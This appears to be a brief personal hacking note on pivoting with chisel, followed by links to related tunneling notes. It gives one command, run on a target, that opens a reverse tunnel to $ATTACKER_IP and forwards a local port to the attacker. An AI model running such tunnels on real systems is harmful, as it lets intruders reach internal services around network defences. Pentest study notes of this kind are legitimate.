# tunneling Forward specific port through chisel

Forward port 1234 on attacker host to 127.0.0.1:1234 on target.
The client specifies the ports.
```
./chisel client $ATTACKER_IP:443 R:1234:127.0.0.1:1234
```

` zet/20221003150601/README.md `

# Related

- [20221020154329](/zet/20221020154329/README.md) port forwarding concept

- [20221003150114](/zet/20221003150114/README.md) socat port forwarding with socat

- [20221003150107](/zet/20221003150107/README.md) ssh port forwarding

- [20221014185949](/zet/20221014185949/README.md) kb file named kb/hacking/commands/pivot-tunnel-through-chisel.md
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub
- [20221003150604](/zet/20221003150604/README.md) tunneling through chisel - socks
- ~/kb/hacking/commands/pivot-tunnel-through-chisel.md

Tags:

    #command #hacking #pivot 
